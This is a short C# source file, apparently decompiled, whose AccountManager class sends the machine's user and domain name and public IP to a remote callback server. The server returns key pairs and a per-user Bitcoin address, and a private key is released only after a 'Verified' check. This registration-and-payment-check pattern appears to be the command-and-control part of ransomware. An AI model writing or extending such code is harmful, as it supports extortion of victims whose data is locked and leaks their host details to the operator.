using System;
using System.Net;
using Newtonsoft.Json.Linq;

namespace Extension;

public static class AccountManager
{
	public static bool CheckVerification()
	{
		string address = Config.CallbackUrl + "?action=check&uniqueKey=" + Config.User.UniqueKey + "&userName=" + Config.UserDomainName;
		using WebClientWithTimeout webClientWithTimeout = new WebClientWithTimeout();
		bool flag = false;
		try
		{
			JObject obj = JObject.Parse(webClientWithTimeout.DownloadString(address));
			flag = (bool)((JToken)obj).SelectToken("Verified");
			string text = (string)((JToken)obj).SelectToken("PrivateKey");
			if (flag && !string.IsNullOrEmpty(text) && text != "null")
			{
				Config.User.PrivateKey = text;
			}
			return flag;
		}
		catch (Exception ex)
		{
			Console.WriteLine("Caught exception: " + ex.Message);
			return false;
		}
	}

	public static bool CreateUser()
	{
		string publicIPAddress = Miscellaneous.GetPublicIPAddress();
		string address = Config.CallbackUrl + "?action=register&uniqueKey=" + Config.User.UniqueKey + "&userName=" + Config.UserDomainName + "&ipAddress=" + publicIPAddress;
		using WebClientWithTimeout webClientWithTimeout = new WebClientWithTimeout();
		webClientWithTimeout.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
		try
		{
			JToken val = (JToken)(object)JObject.Parse(webClientWithTimeout.DownloadString(address));
			bool flag = false;
			try
			{
				if (flag = (bool)val.SelectToken("CreationSuccess"))
				{
					Config.User.PublicKey = (string)val.SelectToken("PublicKey");
					Config.User.PrivateKey = (string)val.SelectToken("PrivateKey");
					Config.User.BtcAddress = (string)val.SelectToken("Address");
					Config.User.Save();
				}
			}
			catch (Exception)
			{
				throw;
			}
			return flag;
		}
		catch (Exception ex2)
		{
			Console.WriteLine("Caught exception: " + ex2.Message);
			return false;
		}
	}
}
